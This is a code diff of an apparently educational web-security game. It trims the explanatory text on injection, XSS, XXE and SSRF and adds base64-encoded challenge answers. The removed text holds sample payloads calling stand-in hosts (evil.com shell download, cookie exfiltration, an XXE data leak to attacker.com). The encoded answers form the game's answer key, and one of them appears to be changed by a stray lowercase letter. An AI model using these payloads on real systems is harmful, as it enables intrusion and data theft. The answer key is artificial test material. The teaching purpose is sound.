@@ -5,7 +5,6 @@ import {
   Terminal,
   Lock,
   Shield,
-  AlertTriangle,
   CheckCircle,
   Eye,
   EyeOff,
@@ -14,7 +13,6 @@ import {
   Database,
   Globe,
   FileText,
-  Cpu,
   Wifi,
   Hash,
   Server,
@@ -22,16 +20,15 @@ import {
   Network,
   Bug,
   Info,
-  X,
   ChevronRight,
   Award,
   Layers,
   Cloud,
   HardDrive,
-  Activity,
   Fingerprint,
 } from 'lucide-react';
 
+import GlitchText from '@/components/GlitchText';
 /*
  * Nope, webdevtools are a good spot
  * to look and cheat - but i thought
@@ -74,12 +71,16 @@ const OkayHackerGame = () => {
       9: 'ZXhhbXBsZS5jb20gQSA2LjYuNi42',
       10: 'Q29va2llOiBzZXNzaW9uPVNJRC1BRE1JTi0yMDI0LVNFQ1VSRQ==',
       11: 'PCFET0NUWVBFIHggWzwhRU5USVRZIGZpbGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0+',
-      12: 'VFJBTlNGRVImJlRSQU5TRkVS',
+      12: 'VFJBTnNGRVImJlRSQU5TRkVS',
       13: 'c2stMHhERUFEQkVFRg==',
       14: 'PHNjcmlwdD5mZXRjaCgnL3RyYW5zZmVyP3RvPWF0dGFja2VyJyk8L3NjcmlwdD4=',
       15: 'MTAuMC4wLjEvLi4vLi4vYWRtaW4=',
       16: 'YWRtaW5fdG9rZW49ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKdWIyNWxJbjAuZXlKaFpHMXBiaUk2ZEhKMVpYMD4=',
       17: 'U0VUIEBAdmVyc2lvbl9jb21tZW50PSNQV05FRA==',
+      // New challenges
+      18: 'VHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQ=',
+      19: 'Ly9ldmlsLmNvbQ==',
+      20: 'WC1GcmFtZS1PcHRpb25zOiBERU5Z',
     };
     return atob(encoded[levelId]);
   };
@@ -104,17 +105,17 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Default Credentials & Weak Authentication',
         description:
-          'Default credentials are pre-configured username/password combinations that come with software, hardware, or services out of the box. These represent one of the most critical security vulnerabilities because they’re publicly documented and easily discoverable. Studies show that over 60% of data breaches involve weak or stolen credentials.',
+          'Default credentials are pre-configured username/password combinations that come with software...',
         technical:
-          'Authentication mechanisms validate user identity. Common weaknesses include: hardcoded credentials in source code, default accounts that aren’t disabled, weak password policies, and lack of account lockout mechanisms. Attackers use automated tools to try thousands of common credential combinations per second.',
+          'Authentication mechanisms validate user identity. Common weaknesses include...',
         when:
-          'Exploited in: IoT devices (cameras, routers), database management systems (MySQL, PostgreSQL), enterprise applications (Tomcat, Jenkins), network equipment (switches, firewalls), and embedded systems. Shodan.io indexes millions of devices still using default credentials.',
+          'Exploited in: IoT devices (cameras, routers), database systems, enterprise apps...',
         example:
-          'Common defaults include: admin/admin, root/toor, administrator/password, guest/guest, sa/sa (SQL Server), postgres/postgres, tomcat/tomcat. Many devices use the MAC address or serial number as the default password.',
+          'Common defaults include: admin/admin, root/toor, administrator/password...',
         impact:
-          'Can lead to complete system compromise, data theft, ransomware deployment, or using the device as part of a botnet.',
+          'Can lead to complete system compromise...',
         prevention:
-          'Force password changes on first login, implement strong password policies, disable default accounts, use multi-factor authentication, and regularly audit user accounts.',
+          'Force password changes on first login, enable MFA, etc.',
       },
       learning:
         '💡 Always change default credentials immediately! Use unique, complex passwords and enable MFA.',
@@ -137,17 +138,17 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'SQL Injection (SQLi) - OWASP #3',
         description:
-          'SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. Attackers can trick the interpreter into executing unintended commands or accessing data without proper authorization. It’s been in the OWASP Top 10 since its inception and remains one of the most dangerous web vulnerabilities.',
+          'SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query...',
         technical:
-          'SQL injection exploits occur when user input is concatenated directly into SQL queries without proper sanitization or parameterization. Types include: Classic SQLi (error-based), Blind SQLi (boolean-based or time-based), Union-based SQLi, and Second-order SQLi. Modern ORMs have reduced but not eliminated this risk.',
+          'SQL injection exploits occur when user input is concatenated directly into SQL queries...',
         when:
-          'Found in: login forms, search functions, product pages, user profiles, admin panels, reporting features, and anywhere user input interacts with databases. Both GET and POST parameters can be vulnerable, as well as HTTP headers and cookies.',
+          'Found in: login forms, search functions, product pages, user profiles...',
         example:
-          "Payloads like ’ OR ‘1’=‘1’ – make conditions always true. UNION SELECT can extract data from other tables. Time-based blind SQLi uses SLEEP() or WAITFOR DELAY to infer data. Stacked queries (; DROP TABLE users–) can destroy data.",
+          "Payloads like ’ OR ‘1’=‘1’ – make conditions always true...",
         impact:
-          'Authentication bypass, data exfiltration, data manipulation, complete database compromise, lateral movement to OS through xp_cmdshell or similar functions.',
+          'Authentication bypass, data exfiltration, data manipulation...',
         prevention:
-          'Use parameterized queries/prepared statements, stored procedures, input validation, least privilege database accounts, and disable dangerous functions. Modern frameworks provide built-in protections when used correctly.',
+          'Use parameterized queries/prepared statements, stored procedures, input validation...',
       },
       learning:
         '💡 Never concatenate user input into queries! Use parameterized statements and principle of least privilege.',
@@ -170,17 +171,17 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'OS Command Injection - Critical Vulnerability',
         description:
-          'Command injection vulnerabilities allow attackers to execute arbitrary operating system commands on the server running an application. This typically occurs when an application passes unsafe user-supplied data to system shells. It’s one of the most severe vulnerabilities as it can lead to complete server compromise.',
+          'Command injection vulnerabilities allow attackers to execute arbitrary operating system commands...',
         technical:
-          'Command injection occurs when applications use system(), exec(), eval() or similar functions with user input. Command separators like ;, &&, ||, |, \n, and \r\n can chain multiple commands. In Windows, & and | are common separators. Backticks ` and $() can be used for command substitution in Unix shells.',
+          'Command injection occurs when applications use system(), exec(), eval() or similar functions...',
         when:
-          'Common in: network administration tools (ping, traceroute, nslookup), file processing utilities, backup scripts, PDF generators, image processors, and system monitoring dashboards. Any feature that interacts with the OS is potentially vulnerable.',
+          'Common in: network administration tools, file processing utilities...',
         example:
-          "Injections like ‘127.0.0.1; cat /etc/passwd’ expose sensitive files. ‘127.0.0.1 && wget http://evil.com/shell.sh && sh shell.sh’ can download and execute malware. Blind command injection uses time delays or DNS lookups to confirm execution.",
+          "‘127.0.0.1; cat /etc/passwd’ exposes sensitive files...",
         impact:
-          'Complete system compromise, data theft, malware installation, lateral network movement, cryptocurrency mining, or using the server for further attacks.',
+          'Complete system compromise, data theft, malware installation...',
         prevention:
-          'Avoid system calls with user input, use language-specific APIs instead of shell commands, implement strict input validation using allowlists, use least privilege accounts, and containerize applications.',
+          'Avoid system calls with user input, use language-specific APIs, implement strict input validation...',
       },
       learning:
         '💡 Never pass user input to system commands! Use built-in library functions and strict validation.',
@@ -203,20 +204,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Cross-Site Scripting (XSS) - OWASP #2',
         description:
-          'XSS flaws occur when applications include untrusted data in web pages without proper validation or escaping. XSS allows attackers to execute scripts in victims’ browsers, hijacking sessions, defacing websites, or redirecting users to malicious sites. It affects 2 out of 3 web applications.',
+          'XSS flaws occur when applications include untrusted data in web pages without proper validation...',
         technical:
-          'Three main types: Reflected XSS (non-persistent, via URL parameters), Stored XSS (persistent, saved in database), and DOM-based XSS (client-side). Modern variants include mutation XSS (mXSS) and blind XSS. Payloads bypass filters using encoding (URL, HTML, Unicode), case variations, and browser quirks.',
+          'Three main types: Reflected XSS, Stored XSS, and DOM-based XSS...',
         when:
-          'Vulnerable areas: comment sections, user profiles, search results, error messages, chat applications, email displays, JSON endpoints rendered as HTML, file uploads (SVG, HTML), and markdown renderers. Both input and output contexts matter.',
+          'Vulnerable areas: comment sections, user profiles, search results...',
         example:
-          "Basic: <script>alert(1)</script>. Event handlers: <img src=x onerror=alert(1)>. Without script tags: <svg onload=alert(1)>. Filter bypasses: <ScRiPt>alert(1)</ScRiPt>. Stealing cookies: fetch('http://evil.com?c='+document.cookie). Keyloggers, cryptocurrency miners, and credential harvesters use XSS.",
+          "Basic: <script>alert(1)</script>. Event handlers: <img src=x onerror=alert(1)>...",
         impact:
-          'Session hijacking, account takeover, phishing, keylogging, cryptocurrency mining, defacement, or delivering malware. Stored XSS can create worms that self-propagate.',
+          'Session hijacking, account takeover, phishing...',
         prevention:
-          'Context-aware output encoding, Content Security Policy (CSP) headers, input validation, HTTPOnly cookie flags, modern frameworks with auto-escaping, and regular security testing.',
+          'Context-aware output encoding, CSP headers, input validation...',
       },
       learning:
-        '💡 Always encode output and implement CSP! Never trust user input, even from authenticated users.',
+        '💡 Always encode output and implement CSP! Never trust user input.',
     },
     {
       id: 5,
@@ -238,17 +239,17 @@ const OkayHackerGame = () => {
         title:
           'Path/Directory Traversal - OWASP #1 (Broken Access Control)',
         description:
-          'Path traversal vulnerabilities allow attackers to access files and directories outside the web root folder. By manipulating file paths with sequences like ‘../’, attackers can navigate the server’s directory structure and access sensitive files like configuration files, source code, or system files.',
+          'Path traversal vulnerabilities allow attackers to access files and directories outside the web root folder...',
         technical:
-          'Traversal sequences include: ../ (Unix/Linux), ..\\ (Windows), URL encoded versions (%2e%2e%2f), double URL encoding (%252e%252e%252f), and Unicode encoding. Some applications strip ../ once, so ….// becomes ../ after filtering. Null bytes (%00) historically bypassed extension checks.',
+          'Traversal sequences include: ../, ..\\, URL-encoded variants, Unicode...',
         when:
-          'Vulnerable features: file download/upload systems, template engines, include() functions, image galleries, document viewers, backup/restore functions, and log viewers. Both filesystem and URL paths can be vulnerable.',
+          'Vulnerable features: file download/upload systems, template engines...',
         example:
-          'Common targets: /etc/passwd (user accounts), /etc/shadow (password hashes), .env files (API keys), wp-config.php (WordPress credentials), web.config/applicationHost.config (IIS), id_rsa (SSH keys). Windows: C:\\Windows\\System32\\config\\SAM (password hashes).',
+          'Common targets: /etc/passwd, /etc/shadow, .env, wp-config.php...',
         impact:
-          'Source code disclosure, sensitive data exposure, credentials theft, configuration manipulation, or remote code execution if combined with file upload vulnerabilities.',
+          'Source code disclosure, sensitive data exposure...',
         prevention:
-          'Use indirect object references (database IDs), chroot jails, strict input validation with allowlists, disable directory listing, and run applications with minimal privileges.',
+          'Use indirect object references, strict input validation, disable directory listing...',
       },
       learning:
         '💡 Never use user input directly in file paths! Use indirect references and proper access controls.',
@@ -272,20 +273,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'JWT Vulnerabilities & Cryptographic Failures - OWASP #2',
         description:
-          'JSON Web Tokens (JWT) are widely used for authentication but often implemented insecurely. Common flaws include accepting unsigned tokens, weak secrets, algorithm confusion attacks, and lack of expiration. Cryptographic failures expose sensitive data through weak encryption, improper key management, or flawed implementations.',
+          'JSON Web Tokens (JWT) are widely used for authentication but often implemented insecurely...',
         technical:
-          'JWT structure: header.payload.signature. Vulnerabilities include: algorithm substitution (RS256 to HS256), none algorithm acceptance, weak HMAC secrets (brute-forceable), key injection, JKU/X5U URL manipulation, and kid (key ID) SQL injection. Tools like jwt_tool and PyJWT help identify these flaws.',
+          'JWT structure: header.payload.signature. Vulnerabilities include algorithm substitution, none acceptance...',
         when:
-          'Found in: REST APIs, single sign-on (SSO) systems, mobile app authentication, microservices communication, and session management. Both authorization headers and cookies can carry JWTs.',
+          'Found in: REST APIs, SSO systems, mobile apps, microservices...',
         example:
-          "Changing alg:RS256 to alg:HS256 treats public key as HMAC secret. Setting alg:none removes signature verification. Weak secrets like ‘secret’ or ‘key’ are crackable in seconds. Modifying payload claims like ‘admin’:false to ‘admin’:true grants privileges.",
+          "Changing alg, weak HMAC secrets, modifying payload claims...",
         impact:
-          'Authentication bypass, privilege escalation, account takeover, sensitive data exposure, and lateral movement across services sharing the same secret.',
+          'Authentication bypass, privilege escalation, account takeover...',
         prevention:
-          'Use strong, rotated secrets (256+ bits), validate algorithm strictly, check token expiration and issuer, use JWK for key management, implement proper token revocation, and consider using refresh tokens.',
+          'Use strong, rotated secrets, validate algorithm strictly, check expiration, use JWK...',
       },
       learning:
-        '💡 Always validate JWT signatures and algorithms! Use strong secrets and implement proper expiration.',
+        '💡 Always validate JWT signatures and algorithms! Use strong secrets and proper expiration.',
     },
     {
       id: 7,
@@ -307,17 +308,17 @@ const OkayHackerGame = () => {
         title:
           'Insecure Direct Object References (IDOR) - Access Control Flaw',
         description:
-          'IDOR vulnerabilities occur when applications expose direct references to internal objects (database keys, filenames) without proper access control checks. Attackers can manipulate these references to access unauthorized data. It’s one of the most common vulnerabilities in modern APIs.',
+          'IDOR vulnerabilities occur when applications expose direct references to internal objects without proper checks...',
         technical:
-          'IDOR exploits predictable patterns in: numeric IDs (user/1234), UUIDs, filenames (document1.pdf), API endpoints, and database keys. Modern applications often use GraphQL, REST APIs, or microservices where authorization checks are forgotten or implemented inconsistently.',
+          'Predictable patterns in numeric IDs, filenames, API endpoints...',
         when:
-          'Vulnerable endpoints: user profiles (/user/123), documents (/download?id=456), invoices (/invoice/789), messages (/chat/message/321), API resources (/api/v1/orders/654), and admin functions. Both horizontal (user-to-user) and vertical (privilege escalation) access violations occur.',
+          'Vulnerable endpoints: user profiles, documents, invoices, messages...',
         example:
-          'Changing /api/user/1000/profile to /api/user/1001/profile accesses another user’s data. Mass data extraction using incremental IDs. Combining with other flaws: IDOR + XSS = worm, IDOR + CSRF = forced actions.',
+          'Changing /api/user/1000/profile to /api/user/1001/profile...',
         impact:
-          'Data breaches, privacy violations, financial theft, corporate espionage, compliance violations (GDPR, HIPAA), and reputation damage.',
+          'Data breaches, privacy violations, financial theft...',
         prevention:
-          'Use random, unpredictable identifiers (UUIDs), implement proper authorization checks for every request, use indirect object references, apply the principle of least privilege, and log access attempts.',
+          'Use unpredictable IDs (UUIDs), proper authorization checks, logging...',
       },
       learning:
         '💡 Always verify user authorization for every resource! Don’t rely on obscurity.',
@@ -341,17 +342,17 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Buffer Overflow - Memory Corruption Vulnerability',
         description:
-          'Buffer overflows occur when programs write more data to a buffer than it can hold, corrupting adjacent memory. This can crash programs, corrupt data, or allow attackers to execute arbitrary code. Despite modern protections, buffer overflows remain relevant, especially in embedded systems and legacy applications.',
+          'Buffer overflows occur when programs write more data to a buffer than it can hold...',
         technical:
-          'Types include: stack-based (overwrite return addresses), heap-based (corrupt heap metadata), integer overflows (cause buffer overflows), and format string bugs. Exploitation involves overwriting instruction pointers, injecting shellcode, or using Return-Oriented Programming (ROP) chains to bypass DEP/NX.',
+          'Types: stack-based, heap-based, integer overflows, format string bugs...',
         when:
-          'Common in: C/C++ applications, embedded systems, kernel drivers, network services, legacy applications, IoT devices, and industrial control systems. Functions like strcpy(), gets(), sprintf() are particularly dangerous.',
+          'Common in: C/C++ applications, embedded systems, drivers...',
         example:
-          'Classic overflow: sending 100 bytes to 50-byte buffer. EIP overwrite: padding + address of shellcode. ROP chains: reuse existing code snippets. Heap spray: fill memory with shellcode. Modern exploits bypass ASLR using information leaks.',
+          'Classic overflow, EIP overwrite, ROP chains...',
         impact:
-          'Remote code execution, privilege escalation, denial of service, data corruption, or complete system compromise. Kernel-level overflows are especially severe.',
+          'RCE, privilege escalation, DoS, data corruption...',
         prevention:
-          'Use memory-safe languages (Rust, Go), enable compiler protections (stack canaries, DEP/NX, ASLR), use safe functions (strncpy vs strcpy), perform bounds checking, and fuzz test applications.',
+          'Use memory-safe languages, compiler protections, safe functions, bounds checking...',
       },
       learning:
         '💡 Use memory-safe languages and functions! Enable all compiler security features.',
@@ -375,20 +376,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'DNS Cache Poisoning - Network Layer Attack',
         description:
-          'DNS cache poisoning (spoofing) corrupts DNS resolver caches, causing name servers to return incorrect IP addresses. This diverts traffic to attacker-controlled servers, enabling phishing, malware distribution, and man-in-the-middle attacks. Despite DNSSEC, many domains remain vulnerable.',
+          'DNS cache poisoning corrupts DNS resolver caches...',
         technical:
-          'Attack vectors: birthday attacks on transaction IDs, Kaminsky attack (poisoning entire domains), fragmentation attacks, and exploiting weak randomization. Attackers race legitimate responses, exploiting predictable query IDs, source ports, or timing. BGP hijacking and registrar attacks achieve similar results.',
+          'Vectors: birthday attacks, Kaminsky, fragmentation...',
         when:
-          'Targets: recursive DNS resolvers, ISP DNS servers, corporate DNS infrastructure, and router DNS caches. Vulnerable during: high query loads, DDoS attacks (when defenses are weakened), or via compromised routers.',
+          'Targets: recursive resolvers, ISP DNS, corporate DNS...',
         example:
-          'Redirecting bank.com to phishing site, injecting malware via fake software updates, NSA’s QUANTUM attacks, Great Firewall DNS injection, and cryptocurrency wallet redirections. Cache poisoning can persist for days (TTL values).',
+          'Redirect bank.com to phishing, fake updates, DNS injection...',
         impact:
-          'Large-scale phishing, malware distribution, credential theft, cryptocurrency theft, censorship, and destroying trust in DNS infrastructure.',
+          'Large-scale phishing, malware distribution, credential theft...',
         prevention:
-          'Deploy DNSSEC validation, use random source ports and transaction IDs, implement 0x20 bit encoding, use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT), and monitor for suspicious DNS changes.',
+          'Deploy DNSSEC, randomize ports/IDs, 0x20 encoding, DoH/DoT...',
       },
       learning:
-        '💡 Implement DNSSEC and use encrypted DNS! Monitor DNS responses for anomalies.',
+        '💡 Implement DNSSEC and use encrypted DNS! Monitor responses.',
     },
     {
       id: 10,
@@ -409,17 +410,17 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Session Hijacking - Authentication Bypass',
         description:
-          'Session hijacking involves stealing or predicting valid session tokens to impersonate legitimate users. Attackers gain unauthorized access without knowing credentials. With sessions lasting hours or days, a single stolen token provides persistent access.',
+          'Session hijacking involves stealing or predicting valid session tokens...',
         technical:
-          'Attack methods: XSS (stealing cookies via JavaScript), network sniffing (unencrypted connections), MITM attacks, session fixation (forcing known session IDs), and prediction (weak randomness). Modern attacks use browser exploitation, malicious extensions, or SS7 vulnerabilities for SMS-based 2FA bypass.',
+          'Methods: XSS, sniffing, MITM, fixation, prediction...',
         when:
-          'Vulnerable scenarios: HTTP sites (no encryption), missing Secure flag on cookies, absent HttpOnly flag (XSS vulnerable), predictable session IDs, sessions not regenerated after login, and long session timeouts.',
+          'Vulnerable: HTTP sites, missing Secure/HttpOnly, predictable IDs...',
         example:
-          'document.cookie exfiltration via XSS, Wireshark capture on public WiFi, predictable PHPSESSID values, session fixation via URL parameters, and cookie jar overflow attacks. Tools: Burp Suite, OWASP ZAP, Firesheep (historical).',
+          'document.cookie exfiltration, public WiFi capture, fixation...',
         impact:
-          'Account takeover, financial fraud, data theft, privilege escalation, and persistent access to sensitive systems.',
+          'Account takeover, fraud, data theft...',
         prevention:
-          'Use HTTPS everywhere, set Secure and HttpOnly cookie flags, implement SameSite attributes, regenerate sessions after authentication, use short timeouts, implement device fingerprinting, and monitor for anomalous session usage.',
+          'HTTPS everywhere, Secure/HttpOnly, SameSite, regen sessions...',
       },
       learning:
         '💡 Always use HTTPS and secure cookie flags! Regenerate sessions after login.',
@@ -443,20 +444,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'XML External Entity (XXE) Injection - OWASP #5',
         description:
-          'XXE vulnerabilities exploit XML parsers that process external entity references within XML documents. Attackers can read local files, perform SSRF attacks, cause denial of service, or achieve remote code execution. Despite JSON’s popularity, XML remains common in enterprise systems, making XXE highly relevant.',
+          'XXE vulnerabilities exploit XML parsers that process external entity references...',
         technical:
-          'XXE exploits DTD (Document Type Definition) processing. Attack types: classic XXE (direct file read), blind XXE (out-of-band data exfiltration), error-based XXE, and XXE-based SSRF. Billion laughs attack causes DoS. Parameter entities and external DTDs bypass restrictions.',
+          'Attacks: classic XXE, blind XXE, error-based XXE, DoS (billion laughs)...',
         when:
-          'Vulnerable systems: SOAP web services, REST APIs accepting XML, SAML authentication, XML configuration parsers, Office document processors (DOCX, XLSX), SVG image processors, and legacy enterprise systems.',
+          'Vulnerable: SOAP services, REST XML, SAML, XML config parsers...',
         example:
-          "File disclosure: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>. SSRF: <!ENTITY xxe SYSTEM 'http://internal-server'>. Blind XXE: <!ENTITY % xxe SYSTEM 'http://attacker.com/?data='> exfiltrates via DNS/HTTP. RCE via expect:// or PHP wrappers.",
+          "File disclosure via SYSTEM entity; SSRF with http://internal-server...",
         impact:
-          'Sensitive file disclosure, internal network scanning, denial of service, SSRF attacks, and potential remote code execution.',
+          'File disclosure, SSRF, DoS, potential RCE.',
         prevention:
-          'Disable DTD processing entirely, disable external entities, use less complex formats (JSON), validate and sanitize XML input, and keep XML processors updated.',
+          'Disable DTD/external entities, validate XML, use JSON...',
       },
       learning:
-        '💡 Disable external entity processing! Consider using JSON instead of XML.',
+        '💡 Disable external entity processing! Prefer JSON when possible.',
     },
     {
       id: 12,
@@ -477,20 +478,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Race Condition / TOCTOU - Concurrency Vulnerability',
         description:
-          'Race conditions occur when multiple processes access shared resources simultaneously without proper synchronization. Time-of-check to time-of-use (TOCTOU) vulnerabilities happen when resource states change between checking and using them. These bugs are subtle, hard to detect, and can have severe consequences.',
+          'Race conditions occur when multiple processes access shared resources simultaneously...',
         technical:
-          'Types: TOCTOU (file system races), double-spending (financial systems), privilege escalation races, and deadlocks. Exploitation requires precise timing, often using multiple threads, processes, or network requests. Modern multi-core systems and distributed architectures increase race condition likelihood.',
+          'TOCTOU (file races), double-spending, privilege escalation races...',
         when:
-          'Vulnerable operations: financial transactions, file operations, authentication checks, coupon/voucher redemption, inventory management, and voting systems. Microservices and serverless architectures introduce new race condition vectors.',
+          'Financial transactions, file ops, auth checks, coupon redemption...',
         example:
-          'Double withdrawal: two simultaneous $1000 withdrawals from $1000 balance. Symlink races: TOCTOU between stat() and open(). Authentication races: changing privileges during login. Coupon stacking: applying same discount multiple times.',
+          'Double withdrawal with parallel operations; symlink races...',
         impact:
-          'Financial loss, data corruption, privilege escalation, business logic bypass, and system instability.',
+          'Financial loss, data corruption, privilege escalation...',
         prevention:
-          'Use atomic operations, implement proper locking (mutex, semaphores), use database transactions with proper isolation levels, implement idempotency keys, and use optimistic/pessimistic locking strategies.',
+          'Atomic ops, proper locking, DB transactions, idempotency keys...',
       },
       learning:
-        '💡 Use atomic operations and proper locking! Test concurrent scenarios thoroughly.',
+        '💡 Use atomic operations and proper locking! Test concurrent scenarios.',
     },
     {
       id: 13,
@@ -512,20 +513,20 @@ const OkayHackerGame = () => {
         title:
           'API Key & Secret Exposure - OWASP #5 (Security Misconfiguration)',
         description:
-          'API keys, passwords, and secrets exposed in code, repositories, or client-side applications represent a critical security failure. With cloud services and SaaS proliferation, a single exposed key can compromise entire infrastructures. GitHub alone discovers thousands of exposed secrets daily.',
+          'API keys, passwords, and secrets exposed in code, repos, or client builds are critical failures...',
         technical:
-          'Common locations: JavaScript source code, mobile app binaries, public repositories, configuration files, error messages, HTML comments, API documentation, and browser developer tools. Secrets include: API keys, OAuth tokens, JWT secrets, database credentials, encryption keys, and webhook URLs.',
+          'Locations: JS source, public repos, config files, error messages, comments...',
         when:
-          'Exposed via: Git commits (even deleted ones), client-side JavaScript, mobile apps (decompiled), public CDNs, misconfigured S3 buckets, Docker images, CI/CD logs, and Stack Overflow posts.',
+          'Via: Git commits, client-side JS, mobile apps, CDNs, S3, CI logs...',
         example:
-          'AWS keys in .git folders, Google API keys in Android apps, Stripe keys in React builds, database passwords in wp-config.php, private keys in Dockerfiles, and tokens in browser localStorage. Tools like TruffleHog, GitLeaks, and GitHub secret scanning find these automatically.',
+          'AWS keys in .git, tokens in localStorage, Stripe keys in builds...',
         impact:
-          'Financial loss (cloud resource abuse), data breaches, service disruption, cryptocurrency theft, and supply chain attacks.',
+          'Financial loss, breaches, service disruption...',
         prevention:
-          'Use environment variables, secret management systems (HashiCorp Vault, AWS Secrets Manager), rotate keys regularly, implement least privilege, use .gitignore properly, and scan repositories for secrets.',
+          'Env vars, secret managers, rotate keys, least privilege, scan repos...',
       },
       learning:
-        '💡 Never commit secrets! Use environment variables and secret management systems.',
+        '💡 Never commit secrets! Use environment variables and secret management.',
     },
     {
       id: 14,
@@ -546,20 +547,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Chained Vulnerabilities - Advanced Attack Patterns',
         description:
-          'Real-world attacks rarely exploit single vulnerabilities. Attackers chain multiple flaws to achieve maximum impact. XSS+CSRF combination bypasses CSRF protections, as the malicious script runs in the legitimate origin context. Understanding attack chains is crucial for effective defense.',
+          'Real-world attacks rarely exploit single vulnerabilities...',
         technical:
-          'Common chains: XSS→CSRF (bypass same-origin policy), SQLi→RCE (read files containing credentials), SSRF→RCE (access internal services), IDOR→Account Takeover→Data Breach. Each vulnerability enables the next, creating devastating attack paths.',
+          'Common chains: XSS→CSRF, SQLi→RCE, SSRF→RCE, IDOR→ATO...',
         when:
-          'Advanced persistent threats (APTs), targeted attacks, bug bounty hunters demonstrating impact, and automated attack tools. Modern frameworks make single vulnerabilities harder to exploit but chains remain effective.',
+          'APTs, targeted attacks, bug bounty proofs...',
         example:
-          "XSS steals CSRF token → CSRF changes email → password reset → account takeover. Upload SVG with XSS → steal admin session → upload web shell → RCE. SSRF to cloud metadata → steal IAM credentials → full cloud compromise.",
+          "XSS steals CSRF token → CSRF changes email → takeover...",
         impact:
-          'Complete system compromise, massive data breaches, persistent access, and cascading failures across connected systems.',
+          'Complete system compromise, massive data breaches...',
         prevention:
-          'Defense in depth, assume breach mentality, implement multiple security layers, regular penetration testing, and security awareness training.',
+          'Defense in depth, multiple layers, regular testing...',
       },
       learning:
-        '💡 Implement defense in depth! One vulnerability can enable many others.',
+        '💡 Implement defense in depth! One vuln can enable many others.',
     },
     {
       id: 15,
@@ -580,20 +581,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Server-Side Request Forgery (SSRF) - OWASP #10',
         description:
-          'SSRF vulnerabilities allow attackers to make requests from the vulnerable server to internal or external resources. This bypasses firewalls, accesses internal services, and potentially compromises cloud infrastructure through metadata endpoints. SSRF has become critical with cloud adoption.',
+          'SSRF allows requests from the vulnerable server to internal/external resources...',
         technical:
-          'Attack vectors: URL parameters, webhooks, PDF generators, image processors, and proxy services. Targets include: internal services (localhost, 127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x), cloud metadata (169.254.169.254), and external services for port scanning. Bypasses use alternative IP representations, DNS rebinding, and redirect chains.',
+          'Vectors: URL params, webhooks, PDF/image processors, proxy services...',
         when:
-          'Vulnerable features: webhooks, file downloads from URLs, PDF generation from HTML, image processing from URLs, link preview generation, and proxy functionality. Cloud environments are especially vulnerable due to metadata services.',
+          'Vulnerable: webhooks, file downloads, link previews, cloud metadata...',
         example:
-          'AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Internal services: http://localhost:8080/admin. Port scanning: iterating through http://internal-host:1-65535. Blind SSRF uses DNS lookups or timing for confirmation.',
+          'AWS metadata, localhost admin, blind SSRF via DNS...',
         impact:
-          'Cloud account takeover, internal network access, sensitive data exposure, remote code execution on internal services, and denial of service.',
+          'Cloud takeover, internal access, data exposure, RCE...',
         prevention:
-          'Whitelist allowed protocols and domains, blacklist private IP ranges, disable unnecessary URL schemas, use separate networks for sensitive services, and disable cloud metadata endpoints.',
+          'Whitelist protocols/domains, block private IPs, disable dangerous schemes...',
       },
       learning:
-        '💡 Validate and whitelist URLs! Isolate internal services from application servers.',
+        '💡 Validate and whitelist URLs! Isolate sensitive services.',
     },
     {
       id: 16,
@@ -614,20 +615,20 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'Insecure Deserialization - OWASP #8',
         description:
-          'Insecure deserialization occurs when untrusted data is used to reconstruct objects. Attackers modify serialized objects to execute code, bypass authentication, or manipulate application logic. This vulnerability is particularly severe as it often leads to remote code execution.',
+          'Insecure deserialization occurs when untrusted data is used to reconstruct objects...',
         technical:
-          'Vulnerable formats: Java serialization, Python pickle, PHP serialize(), .NET BinaryFormatter, and YAML. Attack types: object injection, magic method abuse, gadget chains, and type confusion. Modern variants exploit JSON parsers, protocol buffers, and message queues.',
+          'Vulnerable formats: Java serialization, Python pickle, PHP serialize(), .NET...',
         when:
-          'Found in: session cookies, API tokens, message queues, caching layers, web services, and RPC calls. Microservices communicating via serialized objects are particularly vulnerable.',
+          'Found in: session cookies, API tokens, queues, caches, RPC...',
         example:
-          'Java: Runtime.exec() via gadget chains. Python: pickle.__reduce__ for RCE. PHP: __wakeup() and __destruct() magic methods. Ruby: YAML.load() with !ruby/object. .NET: TypeNameHandling with malicious types.',
+          'Java gadget chains, Python pickle RCE, PHP magic methods...',
         impact:
-          'Remote code execution, privilege escalation, authentication bypass, denial of service, and data tampering.',
+          'RCE, privilege escalation, auth bypass, DoS...',
         prevention:
-          'Never deserialize untrusted data, use simple data formats (JSON), implement integrity checks (digital signatures), isolate deserialization, and monitor for deserialization attacks.',
+          'Never deserialize untrusted data, use signatures, isolate processes...',
       },
       learning:
-        '💡 Never deserialize untrusted data! Use simple formats and validate everything.',
+        '💡 Never deserialize untrusted data! Validate everything.',
     },
     {
       id: 17,
@@ -648,31 +649,134 @@ const OkayHackerGame = () => {
       modalContent: {
         title: 'SQL Truncation & Advanced Injection Techniques',
         description:
-          'SQL truncation attacks exploit database-specific behaviors where data is silently truncated at certain limits. Combined with other techniques like encoding, comments, and database-specific functions, these attacks bypass modern Web Application Firewalls (WAFs) and filtering mechanisms.',
+          'SQL truncation attacks exploit database-specific behaviors...',
         technical:
-          'Techniques include: truncation attacks (exploiting varchar limits), scientific notation (1e1 = 10), alternative comment styles (–, #, /**/, /*!*/), stacked queries, heavy queries for time-based blind SQLi, and database-specific features. MySQL’s GROUP_CONCAT(), PostgreSQL’s string_agg(), and MSSQL’s xp_cmdshell offer unique attack vectors.',
